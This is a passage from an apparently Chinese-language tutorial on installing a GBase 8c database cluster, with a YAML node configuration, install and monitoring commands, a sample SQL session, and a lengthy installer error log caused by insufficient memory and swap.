<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gha_server:</span><br><span class="line">  - gha_server1:</span><br><span class="line">      host: 192.168.8.31</span><br><span class="line">      port: 20001</span><br><span class="line">dcs:</span><br><span class="line">  - host: 192.168.8.31</span><br><span class="line">    port: 2379</span><br><span class="line">#  - host: 192.168.8.32</span><br><span class="line">#    port: 2379</span><br><span class="line">#  - host: 192.168.8.33</span><br><span class="line">#    port: 2379</span><br><span class="line">gtm:</span><br><span class="line">  - gtm1:</span><br><span class="line">      host: 192.168.8.31</span><br><span class="line">      agent_host: 192.168.8.31</span><br><span class="line">      role: primary</span><br><span class="line">      port: 6666</span><br><span class="line">      agent_port: 8001</span><br><span class="line">      work_dir: /home/gbase/data/gtm/gtm1</span><br><span class="line"># 实验环境只保留一个 gtm</span><br><span class="line">#  - gtm2:</span><br><span class="line">#      host: 100.0.1.17</span><br><span class="line">#      agent_host: 10.0.1.17</span><br><span class="line">#      role: standby</span><br><span class="line">#      port: 6666</span><br><span class="line">#      agent_port: 8002</span><br><span class="line">#      work_dir: /home/gbase/data/gtm/gtm2</span><br><span class="line">coordinator:</span><br><span class="line">  - cn1:</span><br><span class="line">      host: 192.168.8.31</span><br><span class="line">      agent_host: 192.168.8.31</span><br><span class="line">      role: primary</span><br><span class="line">      port: 5432</span><br><span class="line">      agent_port: 8003</span><br><span class="line">      work_dir: /home/gbase/data/coord/cn1</span><br><span class="line"># 实验环境只保留一个 cn</span><br><span class="line">#  - cn2:</span><br><span class="line">#      host: 100.0.1.18</span><br><span class="line">#      agent_host: 10.0.1.18</span><br><span class="line">#      role: primary</span><br><span class="line">#      port: 5432</span><br><span class="line">#      agent_port: 8004</span><br><span class="line">#      work_dir: /home/gbase/data/coord/cn2</span><br><span class="line">datanode:</span><br><span class="line">  - dn1:</span><br><span class="line">      - dn1_1:</span><br><span class="line">          host: 192.168.8.32</span><br><span class="line">          agent_host: 192.168.8.32</span><br><span class="line">          role: primary</span><br><span class="line">          port: 15432</span><br><span class="line">          agent_port: 8005</span><br><span class="line">          work_dir: /home/gbase/data/dn1/dn1_1</span><br><span class="line"># 实验环境只保留 primary dn</span><br><span class="line">#      - dn1_2:</span><br><span class="line">#          host: 100.0.1.18</span><br><span class="line">#          agent_host: 10.0.1.18</span><br><span class="line">#          role: standby</span><br><span class="line">#          port: 15433</span><br><span class="line">#          agent_port: 8006</span><br><span class="line">#          work_dir: /home/gbase/data/dn1/dn1_2</span><br><span class="line">#      - dn1_3:</span><br><span class="line">#          host: 100.0.1.16</span><br><span class="line">#          agent_host: 10.0.1.16</span><br><span class="line">#          role: standby</span><br><span class="line">#          port: 15433</span><br><span class="line">#          agent_port: 8006</span><br><span class="line">#          work_dir: /home/gbase/data/dn1/dn1_3</span><br><span class="line">  - dn2:</span><br><span class="line">      - dn2_1:</span><br><span class="line">          host: 192.168.8.33</span><br><span class="line">          agent_host: 192.168.8.33</span><br><span class="line">          role: primary</span><br><span class="line">          port: 20010</span><br><span class="line">          agent_port: 8007</span><br><span class="line">          work_dir: /home/gbase/data/dn2/dn2_1</span><br><span class="line">          # numa:</span><br><span class="line">          #   cpu_node_bind: 0,1</span><br><span class="line">          #   mem_node_bind: 0,1</span><br><span class="line">#      - dn2_2:</span><br><span class="line">#          host: 100.0.1.16</span><br><span class="line">#          agent_host: 10.0.1.16</span><br><span class="line">#          role: standby</span><br><span class="line">#          port: 20010</span><br><span class="line">#          agent_port: 8008</span><br><span class="line">#          work_dir: /home/gbase/data/dn2/dn2_2</span><br><span class="line">#          # numa:</span><br><span class="line">#          #   cpu_node_bind: 2</span><br><span class="line">#          #   mem_node_bind: 2</span><br><span class="line">#      - dn2_3:</span><br><span class="line">#          host: 100.0.1.17</span><br><span class="line">#          agent_host: 10.0.1.17</span><br><span class="line">#          role: standby</span><br><span class="line">#          port: 20010</span><br><span class="line">#          agent_port: 8009</span><br><span class="line">#          work_dir: /home/gbase/data/dn2/dn2_3</span><br><span class="line">#          # numa:</span><br><span class="line">#          #   cpu_node_bind: 3</span><br><span class="line">#          #   mem_node_bind: 3</span><br><span class="line">env:</span><br><span class="line">  # cluster_type allowed values: multiple-nodes, single-inst, default is multiple-nodes</span><br><span class="line">  cluster_type: multiple-nodes</span><br><span class="line">  pkg_path: /home/gbase/gbase_package # 安装包所在路径</span><br><span class="line">  prefix: /home/gbase/gbase_db # 运行目录</span><br><span class="line">  version: V5_S3.0.0B76 # 与安装包版本一致 GBase8cV5_S3.0.0B76</span><br><span class="line">  user: gbase</span><br><span class="line">  port: 22</span><br><span class="line"># constant:</span><br><span class="line">#   virtual_ip: 100.0.1.254/24</span><br></pre></td></tr></table></figure></div>
<h4 id="2-执行安装脚本">(2) 执行安装脚本</h4>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 gbase_package]$ cd /home/gbase/gbase_package/script</span><br><span class="line">[gbase@gbase8c_1 script]$ ./gha_ctl install -c gbase -p /home/gbase/gbase_package</span><br></pre></td></tr></table></figure></div>
<p>注释：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c 参数：数据库名称，默认 gbase</span><br><span class="line">-p 参数：配置文件路径，默认 /home/gbase</span><br></pre></td></tr></table></figure></div>
<p>执行时间约 5 分钟，安装结束后，脚本会提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ret&quot;:0,</span><br><span class="line">    &quot;msg&quot;:&quot;Success&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>集群安装成功！</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-05.png"
                      alt="" loading="lazy"
                ></p>
<h4 id="3-节点状态检查">(3) 节点状态检查</h4>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 script]$ /home/gbase/gbase_package/script/gha_ctl monitor -l http://192.168.8.31:2379</span><br></pre></td></tr></table></figure></div>
<p>结果如下，说明集群安装正常，数据服务启动中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 script]$ /home/gbase/gbase_package/script/gha_ctl monitor -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;cluster&quot;: &quot;gbase&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;V5_S3.0.0B76&quot;,</span><br><span class="line">    &quot;server&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;gha_server1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;20001&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;isLeader&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;gtm&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;gtm1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;6666&quot;,</span><br><span class="line">            &quot;workDir&quot;: &quot;/home/gbase/data/gtm/gtm1&quot;,</span><br><span class="line">            &quot;agentPort&quot;: &quot;8001&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">            &quot;agentHost&quot;: &quot;192.168.8.31&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;coordinator&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;cn1&quot;,</span><br><span class="line">            &quot;host&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;port&quot;: &quot;5432&quot;,</span><br><span class="line">            &quot;workDir&quot;: &quot;/home/gbase/data/coord/cn1&quot;,</span><br><span class="line">            &quot;agentPort&quot;: &quot;8003&quot;,</span><br><span class="line">            &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">            &quot;agentHost&quot;: &quot;192.168.8.31&quot;,</span><br><span class="line">            &quot;central&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;datanode&quot;: &#123;</span><br><span class="line">        &quot;dn1&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;dn1_1&quot;,</span><br><span class="line">                &quot;host&quot;: &quot;192.168.8.32&quot;,</span><br><span class="line">                &quot;port&quot;: &quot;15432&quot;,</span><br><span class="line">                &quot;workDir&quot;: &quot;/home/gbase/data/dn1/dn1_1&quot;,</span><br><span class="line">                &quot;agentPort&quot;: &quot;8005&quot;,</span><br><span class="line">                &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">                &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">                &quot;agentHost&quot;: &quot;192.168.8.32&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;dn2&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;dn2_1&quot;,</span><br><span class="line">                &quot;host&quot;: &quot;192.168.8.33&quot;,</span><br><span class="line">                &quot;port&quot;: &quot;20010&quot;,</span><br><span class="line">                &quot;workDir&quot;: &quot;/home/gbase/data/dn2/dn2_1&quot;,</span><br><span class="line">                &quot;agentPort&quot;: &quot;8007&quot;,</span><br><span class="line">                &quot;state&quot;: &quot;running&quot;,</span><br><span class="line">                &quot;role&quot;: &quot;primary&quot;,</span><br><span class="line">                &quot;agentHost&quot;: &quot;192.168.8.33&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;dcs&quot;: &#123;</span><br><span class="line">        &quot;clusterState&quot;: &quot;healthy&quot;,</span><br><span class="line">        &quot;members&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;url&quot;: &quot;http://192.168.8.31:2379&quot;,</span><br><span class="line">                &quot;id&quot;: &quot;bfb7ea6d0aaed3aa&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;node_0&quot;,</span><br><span class="line">                &quot;isLeader&quot;: true,</span><br><span class="line">                &quot;state&quot;: &quot;healthy&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[gbase@gbase8c_1 script]$ </span><br></pre></td></tr></table></figure></div>
<h3 id="9-连接和-SQL-测试">9. 连接和 SQL 测试</h3>
<p>在主节点 <code>gbase8c_1</code> 执行 <code>$ gsql -d postgres -p 5432</code>，出现 <code>postgres=#</code> 操作符说明客户端工具 gsql 成功连接 GBase 8c 数据库。</p>
<ul>
<li>输出结果如下：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gsql -d postgres -p 5432</span><br><span class="line">gsql ((multiple_nodes GBase8cV5 3.0.0B76 build 47948f99) compiled at 2023-02-27 16:04:20 commit 0 last mr 1232 )</span><br><span class="line">Non-SSL connection (SSL connection is recommended when requiring high-security)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# create database testdb;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# create table student(ID int, Name varchar(10));</span><br><span class="line">CREATE TABLE</span><br><span class="line">postgres=# insert into student values(1, &#x27;Mike&#x27;),(2,&#x27;John&#x27;);</span><br><span class="line">INSERT 0 2</span><br><span class="line">postgres=# select * from student;</span><br><span class="line"> id | name </span><br><span class="line">----+------</span><br><span class="line">  1 | Mike</span><br><span class="line">  2 | John</span><br><span class="line">(2 rows)</span><br><span class="line"></span><br><span class="line">postgres=# \l</span><br><span class="line">                         List of databases</span><br><span class="line">   Name    | Owner | Encoding | Collate | Ctype | Access privileges </span><br><span class="line">-----------+-------+----------+---------+-------+-------------------</span><br><span class="line"> postgres  | gbase | UTF8     | C       | C     | </span><br><span class="line"> template0 | gbase | UTF8     | C       | C     | =c/gbase         +</span><br><span class="line">           |       |          |         |       | gbase=CTc/gbase</span><br><span class="line"> template1 | gbase | UTF8     | C       | C     | =c/gbase         +</span><br><span class="line">           |       |          |         |       | gbase=CTc/gbase</span><br><span class="line"> testdb    | gbase | UTF8     | C       | C     | </span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">postgres=# \d student</span><br><span class="line">           Table &quot;public.student&quot;</span><br><span class="line"> Column |         Type          | Modifiers </span><br><span class="line">--------+-----------------------+-----------</span><br><span class="line"> id     | integer               | </span><br><span class="line"> name   | character varying(10) | </span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-06.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="异常错误">异常错误</h2>
<h3 id="如-SWAP-不足-8G-且内存分配不足，安装过程中会抛异常错误。">如 SWAP 不足 8G 且内存分配不足，安装过程中会抛异常错误。</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ret&quot;:-1,</span><br><span class="line">    &quot;msg&quot;:&quot;Failed to execute the command: source ~/.bashrc;gs_install -X /tmp/gs_gha_2023-03-15_00:00:27_280594/clusterconfig.xml --init-instance. Error:\nRun cmd failed:cmd[source ~/.bashrc;gs_install -X /tmp/gs_gha_2023-03-15_00:00:27_280594/clusterconfig.xml --init-instance], msg[Parsing the configuration file.\nCheck preinstall on every node.\nSuccessfully checked preinstall on every node.\nCreating the backup directory.\nSuccessfully created the backup directory.\nbegin deploy..\nInstalling the cluster.\nencrypt cipher and rand files for database.\nbegin to create CA cert files\nThe sslcert will be generated in /home/gbase/gbase_db/app/share/sslcert/om\nCluster installation is completed.\nConfiguring.\nDeleting instances from all nodes.\nSuccessfully deleted instances from all nodes.\nChecking node configuration on all nodes.\nInitializing instances on all nodes.\nUpdating instance configuration on all nodes.\nCheck consistence of memCheck and coresCheck on database nodes.\nSuccessful check consistence of memCheck and coresCheck on all nodes.\nConfiguring pg_hba on all nodes.\nConfiguration is completed.\n[FAILURE] gbase8c_1.shawnyan.com:\nUsing gbase:gbase to install database.\nUsing installation program path : /home/gbase/gbase_db/app_89583529\n$GAUSSHOME points to /home/gbase/gbase_db/app_89583529, no need to create symbolic link.\n[2023-03-15 00:01:28.543][17735][][gs_ctl]: gs_ctl started,datadir is /home/gbase/data/gtm/gtm1 \n[2023-03-15 00:01:28.693][17735][][gs_ctl]: waiting for server to start...\n.0 LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n0 LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n0 LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n0 LOG:  [Alarm Module]Cluster Name: gbase \n\t\n0 LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n0 WARNING:  failed to open feature control file, please check whether it exists: FileName=gaussdb.version, Errno=2, Errmessage=No such file or directory.\n0 WARNING:  failed to parse feature control file: gaussdb.version.\n0 WARNING:  Failed to load the product control file, so gaussdb cannot distinguish product version.\nThe core dump path is an invalid directory\n2023-03-15 00:01:28.936 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm DB010  0 [REDO] LOG:  Recovery parallelism, cpu count = 2, max = 4, actual = 2\n2023-03-15 00:01:28.936 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm DB010  0 [REDO] LOG:  ConfigRecoveryParallelism, true_max_recovery_parallelism:4, max_recovery_parallelism:4\ngaussdb.state does not exist, and skipt setting since it is optional.2023-03-15 00:01:28.958 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n2023-03-15 00:01:28.958 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n2023-03-15 00:01:28.958 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n2023-03-15 00:01:28.958 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  [Alarm Module]Cluster Name: gbase \n\t\n2023-03-15 00:01:28.958 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n2023-03-15 00:01:28.962 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  loaded library \&quot;security_plugin\&quot;\n2023-03-15 00:01:28.963 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:28.963 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:29.015 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  InitNuma numaNodeNum: 1 numa_distribute_mode: none inheritThreadPool: 0.\n2023-03-15 00:01:29.016 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 01000  0 [BACKEND] WARNING:  Failed to initialize the memory protect for g_instance.attr.attr_storage.cstore_buffers (1024 Mbytes) or shared memory (3556 Mbytes) is larger.\n2023-03-15 00:01:29.104 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [CACHE] LOG:  set data cache  size(805306368)\n2023-03-15 00:01:29.128 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [CACHE] LOG:  set metadata cache  size(268435456)\n2023-03-15 00:01:29.834 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [SEGMENT_PAGE] LOG:  Segment-page constants: DF_MAP_SIZE: 8156, DF_MAP_BIT_CNT: 65248, DF_MAP_GROUP_EXTENTS: 4175872, IPBLOCK_SIZE: 8168, EXTENTS_PER_IPBLOCK: 1021, IPBLOCK_GROUP_SIZE: 4090, BMT_HEADER_LEVEL0_TOTAL_PAGES: 8323072, BktMapEntryNumberPerBlock: 2038, BktMapBlockNumber: 25, BktBitMaxMapCnt: 512\n2023-03-15 00:01:29.961 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  gaussdb: fsync file \&quot;/home/gbase/data/gtm/gtm1/gaussdb.state.temp\&quot; success\n2023-03-15 00:01:29.965 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  create gaussdb state file success: db state(STARTING_STATE), server mode(Normal), connection index(1)\n2023-03-15 00:01:29.992 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  max_safe_fds = 971, usable_fds = 1000, already_open = 19\nThe core dump path is an invalid directory\n2023-03-15 00:01:30.010 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  user configure file is not found, it will be created.\n2023-03-15 00:01:30.016 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  the configure file /home/gbase/gbase_db/app_89583529/etc/gscgroup_gbase.cfg doesn&#x27;t exist or the size of configure file has changed. Please create it by root user!\n2023-03-15 00:01:30.016 64109a58.1 [unknown] 140495039762880 [unknown] 0 gtm 00000  0 [BACKEND] LOG:  Failed to parse cgroup config file.\n.\n[2023-03-15 00:01:31.086][17735][][gs_ctl]:  done\n[2023-03-15 00:01:31.086][17735][][gs_ctl]: server started (/home/gbase/data/gtm/gtm1)\nTraceback (most recent call last):\n  File \&quot;/home/gbase/gbase_db/om/script/local/Install.py\&quot;, line 784, in &lt;module&gt;\n    functionDict[g_opts.action]()\n  File \&quot;/home/gbase/gbase_db/om/script/local/Install.py\&quot;, line 710, in startCluster\n    cn.start(self.time_out)\n  File \&quot;/home/gbase/gbase_db/om_89583529/script/local/../gspylib/component/Kernel/Kernel.py\&quot;, line 109, in start\n    raise Exception(ErrorCode.GAUSS_516[\&quot;GAUSS_51607\&quot;] % \&quot;instance\&quot;\nException: [GAUSS-51607] : Failed to start instance. Error: Please check the gs_ctl log for failure details.\n[2023-03-15 00:01:31.140][17808][][gs_ctl]: gs_ctl started,datadir is /home/gbase/data/coord/cn1 \n[2023-03-15 00:01:31.279][17808][][gs_ctl]: waiting for server to start...\n.0 LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n0 LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n0 LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n0 LOG:  [Alarm Module]Cluster Name: gbase \n\t\n0 LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n0 WARNING:  failed to open feature control file, please check whether it exists: FileName=gaussdb.version, Errno=2, Errmessage=No such file or directory.\n0 WARNING:  failed to parse feature control file: gaussdb.version.\n0 WARNING:  Failed to load the product control file, so gaussdb cannot distinguish product version.\nThe core dump path is an invalid directory\ngaussdb.state does not exist, and skipt setting since it is optional.2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Cluster Name: gbase \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n2023-03-15 00:01:31.503 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  loaded library \&quot;security_plugin\&quot;\n2023-03-15 00:01:31.504 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:31.504 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  InitNuma numaNodeNum: 1 numa_distribute_mode: none inheritThreadPool: 0.\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  reserved memory for backend threads is: 340 MB\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  reserved memory for WAL buffers is: 320 MB\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  Set max backend reserve memory is: 660 MB, max dynamic memory is: 6554 MB\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  shared memory 4049 Mbytes, memory context 7214 Mbytes, max process memory 12288 Mbytes\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] FATAL:  could not create shared memory segment: Cannot allocate memory\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] DETAIL:  Failed system call was shmget(key=5432001, size=4246569008, 03600).\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] HINT:  This error usually means that openGauss&#x27;s request for a shared memory segment exceeded available memory or swap space, or exceeded your kernel&#x27;s SHMALL parameter.  You can either reduce the request size or reconfigure the kernel with larger SHMALL.  To reduce the request size (currently 4246569008 bytes), reduce openGauss&#x27;s shared memory usage, perhaps by reducing shared_buffers.\n\tThe openGauss documentation contains more information about shared memory configuration.\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] BACKTRACELOG:  tid[17811]&#x27;s backtrace:\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xf21792) [0x5616ec545792]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z9errfinishiz+0x391) [0x5616ec53b9d1]\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xcd7e5c) [0x5616ec2fbe5c]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z20PGSharedMemoryCreatembi+0x5a) [0x5616ec2fc21a]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z31CreateSharedMemoryAndSemaphoresbi+0x229) [0x5616ed236929]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z14PostmasterMainiPPc+0x1757) [0x5616ecab0697]\n\t/home/gbase/gbase_db/app/bin/gaussdb(main+0x3ef) [0x5616ec04d06f]\n\t/lib64/libc.so.6(__libc_start_main+0xf5) [0x7f32a5217555]\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xa9dea7) [0x5616ec0c1ea7]\n\tUse addr2line to get pretty function name and line\n\t\n2023-03-15 00:01:31.540 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  FiniNuma allocIndex: 0.\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: waitpid 17811 failed, exitstatus is 256, ret is 2\n\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: stopped waiting\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: could not start server\nExamine the log output.\n\n[GAUSS-51607] : Failed to start instance. Error: Please check the gs_ctl log for failure details.\n[2023-03-15 00:01:31.140][17808][][gs_ctl]: gs_ctl started,datadir is /home/gbase/data/coord/cn1 \n[2023-03-15 00:01:31.279][17808][][gs_ctl]: waiting for server to start...\n.0 LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n0 LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n0 LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n0 LOG:  [Alarm Module]Cluster Name: gbase \n\t\n0 LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n0 WARNING:  failed to open feature control file, please check whether it exists: FileName=gaussdb.version, Errno=2, Errmessage=No such file or directory.\n0 WARNING:  failed to parse feature control file: gaussdb.version.\n0 WARNING:  Failed to load the product control file, so gaussdb cannot distinguish product version.\nThe core dump path is an invalid directory\ngaussdb.state does not exist, and skipt setting since it is optional.2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host Name: gbase8c_1.shawnyan.com \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host IP: 192.168.8.31 \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Cluster Name: gbase \n\t\n2023-03-15 00:01:31.498 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n2023-03-15 00:01:31.503 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  loaded library \&quot;security_plugin\&quot;\n2023-03-15 00:01:31.504 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:31.504 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  InitNuma numaNodeNum: 1 numa_distribute_mode: none inheritThreadPool: 0.\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  reserved memory for backend threads is: 340 MB\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  reserved memory for WAL buffers is: 320 MB\n2023-03-15 00:01:31.530 64109a5b.1 